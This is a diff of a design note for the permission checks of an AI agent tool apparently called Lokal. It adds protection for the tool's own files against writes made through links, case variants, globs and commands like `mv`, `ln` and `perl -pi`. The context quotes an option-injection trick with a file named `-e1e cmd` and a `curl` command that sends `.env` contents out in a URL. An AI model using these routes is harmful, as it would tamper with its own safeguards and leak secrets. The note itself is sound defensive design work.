@@ -175,6 +175,12 @@ before touching that.
     could make one: anything right in a home folder (`~/${f}rc`), or a
     glob that could be a protected name (`AGENT?.md`, `App*`). With no
     place known, a relative path is judged by its own names.
+  - Lokal's own files count by what they are, not only by their names
+    (#57): a word that is the file a link of theirs leads to, under any
+    name it has (a hard link, another case on a Windows drive), or a glob
+    that could be it in its folder, however the line uses it (`mv`, `ln`,
+    `perl -pi`). Code that names it inside a string (`python3 -c`) is
+    code Lokal can't read, as anywhere else.
   - A glob where a file named like an option could write (`rg x *`,
     `sed -n 1p *`, whose `-e1e cmd` runs one).
   - A file in a protected place (`protected::is_protected`), in any
@@ -185,10 +191,11 @@ before touching that.
     `mise.toml`, `.ssh` and `.gnupg`, a bare repository's hooks, the
     person's settings hidden right in a home folder (`~/.config/…`, or a
     Windows profile's `.wslconfig`), `~/bin`, Windows' `AppData` (its
-    Startup folder too) and PowerShell profiles, and a PATH folder. A
-    project kept in one (`~/.dotfiles`) is worked on with its commands
-    on Yes, and its writes on No. And `remember`, which changes what every
-    conversation starts with.
+    Startup folder too) and PowerShell profiles, a PATH folder, and
+    Lokal's own files, wherever a link of theirs leads (#57). A project
+    kept in one (`~/.dotfiles`) is worked on
+    with its commands on Yes, and its writes on No. And `remember`, which
+    changes what every conversation starts with.
 - **Accepted, and guarded by the judge only:** data written into a GET's
   URL, headers or user agent (`curl "…?q=$(cat .env)"`), until #2's box
   takes the network away; `python3 -m http.server`, which serves the
